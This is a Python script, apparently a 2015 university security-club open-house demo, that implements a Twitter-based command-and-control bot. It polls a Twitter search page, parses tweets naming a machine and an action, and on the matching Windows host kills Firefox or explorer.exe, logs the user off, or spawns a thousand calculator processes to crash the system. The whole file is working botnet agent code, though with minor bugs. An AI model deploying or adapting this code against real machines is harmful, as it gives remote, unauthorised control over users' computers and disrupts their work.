#!/usr/bin/env python
''' Author: Jared E Stroud
    Purpose: RIT CSEC Open House Twitter C2 (Fall 2015)
    Email: jxs1261@rit.edu
'''

import requests
import re
import time
import os
import subprocess

class WindowsCmds():
    '''
        Executing Windows commands.
    '''
    def __init__():
        import subprocess

    def killFirefox():
        '''
            Params: None
            Purpose: Kill Firefox.
            Return: Nothing.
        '''
        os.system('taskkill /f /im firefox.exe')

    def killExplorer():
        '''
            Params: None
            Purpose: Kill explorer.exe 
            Return: Nothing.
        '''
        os.system('taskkill /f /im explorer.exe')

    def logOff():
        '''
            Params: None
            Purpose: Logoff user
            Return: Nothing.
        '''
        os.system('shutdown /l')

    def magnify():
        '''
            Params: None
            Purpose: Spawn magnify
            Return: Nothing.
        '''
        os.system('magnify.exe')

    def calcMe():
        '''
            Params: None
            Purpose: Death by calc. Bo would approve.
            Return: Nothing.

            WARNING: This will crash everything.
        '''
        x = 0
        while x < 1000:
            subprocess.Popen(['calc.exe'])
            x += 1


class TweetScrape():
    '''
        No Twitter libraries just requests (standard in Python 3.2+ (I think))
        and handy dandy regexes.
    '''

    def __init__(self):
        '''
            Initialization of the class.

        '''
        self.hello_world = "Running application..."
        print(self.hello_world) # Debugging


    def get_Tweets(self,url):
        '''
            Parameters: 
                Url: Twitter page to scrape.

        '''
        r = requests.get(url)
        if r.status_code == 200:
            return r.text.encode('utf8') # Ensure no weird unicode stuff happens.
        else:
            print("Something broke...")# Content doesn't exist :/ 
            sys.exit()

    def obtain_commands(self,content):
        '''
            Parameters: 
                    Content: Regex through content from get_Tweets
                        to obtain commands.

            Return: Twitter commands.
        '''
        cmd = re.search(r"(CSEC)\.\w+\.\w+", str(content)) # Hash tagto use followed by a space the command another space and the target machine.
        if cmd == None:
            print(content) # Debugging
        else:
            return cmd.group(0) #, cmd.group(1) # group(0) for everything

    def windows_cmdExcution(self, command):
        '''
            Parameters: 
                    Command: Botnet function to execute.
                    Machine: Lab machine to attack.
            Return: Nothing
        '''
        winexe = WindowsCmds # Windows class object creation.

        if command == "MidtermMadness": 
            winexe.killFirefox()

        elif command  == "GolisanoSmash":
            winexe.killExplorer()

        elif command  == "Daryl":
            winexe.magnify()

        elif command  == "Deli":
            winexe.logOff()

        elif command  == "YuanSpawn":
            winexe.calcMe()
        else:
            time.sleep(3)

    def split_tweet(self, dottedTweet):
        '''
            Parameters: 
                dottedTweet: CSEC.Open.House would be an input obtained by obtain_commands 
                This function split that tweet into three separate words.

                The results of this function will be passed into windows_cmdExecution to complete a command.
        '''

        name = os.environ['COMPUTERNAME']
        machine = dottedTweet.split(".")[1]
        action = dottedTweet.split(".")[2]
        print("Action: " + str(action) + " applied to machine " + str(machine)) #Debugging

        if machine == name: #If the tweet is directed at the machine, execute. 
            self.windows_cmdExcution(action) 

if __name__ == "__main__":

    # Object declaration
    twitter = TweetScrape()

    while 1: # Continuously loop with a 25 second sleep.

        twitter_content = twitter.get_Tweets("https://twitter.com/search?f=tweets&vertical=default&q=%40RITCSEC&src=typd") # Twitter scraping of RITCSECOpenhouse Page.
        command_tweet = twitter.obtain_commands(twitter_content)
        twitter.split_tweet(command_tweet)
        time.sleep(25)
